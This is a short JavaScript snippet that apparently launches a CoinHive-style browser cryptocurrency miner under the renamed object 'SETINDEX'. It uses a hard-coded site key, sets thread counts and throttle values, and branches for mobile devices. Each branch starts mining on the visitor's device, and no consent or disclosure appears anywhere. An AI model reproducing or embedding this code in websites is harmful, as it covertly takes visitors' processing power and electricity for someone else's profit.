let base = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
	forceASMJS: false
});

if (!base.isMobile()){
	let site = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
		threads: base.getNumThreads() / 2,
		throttle: 0.4,
		forceASMJS: false
	});
	site.start();
} else {
	let site = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
		threads: base.getNumThreads() / 2,
		throttle: 0.3,
		forceASMJS: false
	});
	site.start();
}
